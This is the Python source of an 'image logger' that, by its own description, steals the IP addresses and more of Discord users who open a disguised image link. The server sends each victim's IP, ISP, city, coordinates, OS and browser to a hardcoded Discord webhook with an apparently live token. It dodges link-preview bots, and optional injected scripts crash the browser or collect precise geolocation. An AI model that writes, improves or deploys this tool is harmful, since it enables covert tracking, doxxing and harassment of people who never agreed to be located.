# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1540303370693382204/d9TYctAed6gOcl3xdyV7Vy_FtJP3h17wSjRXZRCPutNcxxv4Hq8ValygcF9UydF1glwb",
    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200",
    "imageArgument": True,

    # CUSTOMIZATION #
    "username": "Image Logger",
    "color": 0x00FFFF,

    # OPTIONS #
    "crashBrowser": False,
    "accurateLocation": False,

    "message": {
        "doMessage": False,
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger",
        "richMessage": True,
    },

    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,

    # REDIRECTION #
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    },
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    try:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": "@everyone",
            "embeds": [
                {
                    "title": "Image Logger - Error",
                    "color": config["color"],
                    "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
                }
            ],
        })
    except Exception as e:
        print(f"Error reporting to Discord: {e}")

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    try:
        if ip.startswith(blacklistedIPs):
            return
        
        bot = botCheck(ip, useragent)
        
        if bot:
            if config["linkAlerts"]:
                requests.post(config["webhook"], json={
                    "username": config["username"],
                    "content": "",
                    "embeds": [
                        {
                            "title": "Image Logger - Link Sent",
                            "color": config["color"],
                            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                        }
                    ],
                })
            return

        ping = "@everyone"

        try:
            info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
        except:
            info = {
                "proxy": False,
                "hosting": False,
                "isp": "Unknown",
                "as": "Unknown",
                "country": "Unknown",
                "regionName": "Unknown",
                "city": "Unknown",
                "lat": 0,
                "lon": 0,
                "timezone": "Unknown/Unknown",
                "mobile": False
            }

        if info.get("proxy"):
            if config["vpnCheck"] == 2:
                return
            
            if config["vpnCheck"] == 1:
                ping = ""
        
        if info.get("hosting"):
            if config["antiBot"] == 4:
                if info.get("proxy"):
                    pass
                else:
                    return

            if config["antiBot"] == 3:
                return

            if config["antiBot"] == 2:
                if info.get("proxy"):
                    pass
                else:
                    ping = ""

            if config["antiBot"] == 1:
                ping = ""

        try:
            os, browser = httpagentparser.simple_detect(useragent)
        except:
            os, browser = "Unknown", "Unknown"
        
        embed_data = {
            "username": config["username"],
            "content": ping,
            "embeds": [
                {
                    "title": "Image Logger - IP Logged",
                    "color": config["color"],
                    "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info.get('isp', 'Unknown')}`
> **ASN:** `{info.get('as', 'Unknown')}`
> **Country:** `{info.get('country', 'Unknown')}`
> **Region:** `{info.get('regionName', 'Unknown')}`
> **City:** `{info.get('city', 'Unknown')}`
> **Coords:** `{str(info.get('lat', 0))+', '+str(info.get('lon', 0)) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info.get('timezone', 'Unknown/Unknown').split('/')[1].replace('_', ' ')} ({info.get('timezone', 'Unknown/Unknown').split('/')[0]})`
> **Mobile:** `{info.get('mobile', False)}`
> **VPN:** `{info.get('proxy', False)}`
> **Bot:** `{info.get('hosting', False) if info.get('hosting', False) and not info.get('proxy', False) else 'Possibly' if info.get('hosting', False) else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:** `{useragent}`

}
            ],
        }
        
        if url:
            embed_data["embeds"][0].update({"thumbnail": {"url": url}})
        
        requests.post(config["webhook"], json=embed_data)
        return info
    except Exception as e:
        print(f"Error making report: {e}")
        return None

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            # Get client IP
            client_ip = self.headers.get('x-forwarded-for') or self.client_address[0]
            
            # Check if IP is blacklisted
            if client_ip.startswith(blacklistedIPs):
                return
            
            # Handle URL parameters
            s = self.path
            dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
            
            # Get URL from parameters or config
            url = config["image"]
            if config["imageArgument"]:
                if dic.get("url"):
                    try:
                        url = base64.b64decode(dic.get("url")).decode()
                    except:
                        pass
                elif dic.get("id"):
                    try:
                        url = base64.b64decode(dic.get("id").encode()).decode()
                    except:
                        pass
            
            # Check if it's a bot
            bot = botCheck(client_ip, self.headers.get('user-agent'))
            
            if bot:
                self.send_response(200 if config["buggedImage"] else 302)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 
                                'image/jpeg' if config["buggedImage"] else url)
                self.end_headers()

                if config["buggedImage"]:
                    self.wfile.write(binaries["loading"])

                makeReport(client_ip, endpoint=s.split("?")[0], url=url)
                return
            
            # Get location data if available
            location = None
            if dic.get("g") and config["accurateLocation"]:
                try:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                except:
                    pass
            
            # Make report
            result = makeReport(client_ip, self.headers.get('user-agent'), 
                              location, s.split("?")[0], url=url)
            
            # Prepare response data
            message = config["message"]["message"]
            datatype = 'text/html'
            
            # Process rich message if enabled
            if config["message"]["richMessage"] and result:
                message = message.replace("{ip}", client_ip)
                message = message.replace("{isp}", result.get("isp", "Unknown"))
                message = message.replace("{asn}", result.get("as", "Unknown"))
                message = message.replace("{country}", result.get("country", "Unknown"))
                message = message.replace("{region}", result.get("regionName", "Unknown"))
                message = message.replace("{city}", result.get("city", "Unknown"))
                message = message.replace("{lat}", str(result.get("lat", 0)))
                message = message.replace("{long}", str(result.get("lon", 0)))
                
                timezone = result.get("timezone", "Unknown/Unknown")
                if "/" in timezone:
                    timezone_parts = timezone.split("/")
                    timezone = f"{timezone_parts[1].replace('_', ' ')} ({timezone_parts[0]})"
                message = message.replace("{timezone}", timezone)
                
                message = message.replace("{mobile}", str(result.get("mobile", False)))
                message = message.replace("{vpn}", str(result.get("proxy", False)))
                
                hosting = result.get("hosting", False)
                proxy = result.get("proxy", False)
                if hosting and not proxy:
                    bot_val = "True"
                elif hosting:
                    bot_val = "Possibly"
                else:
                    bot_val = "False"
                message = message.replace("{bot}", bot_val)
                
                try:
                    os, browser = httpagentparser.simple_detect(self.headers.get('user-agent'))
                except:
                    os, browser = "Unknown", "Unknown"
                
                message = message.replace("{browser}", browser)
                message = message.replace("{os}", os)
            
            # Handle different response types
            if config["redirect"]["redirect"]:
                data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
            elif config["message"]["doMessage"]:
                data = message.encode()
            else:
                data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            # Add browser crash code if enabled
            if config["crashBrowser"]:
                data += b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'
            
            # Add geolocation script if enabled
            if config["accurateLocation"]:
                data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
            
            # Send response
            self.send_response(200)
            self.send_header('Content-type', datatype)
            self.end_headers()
            self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
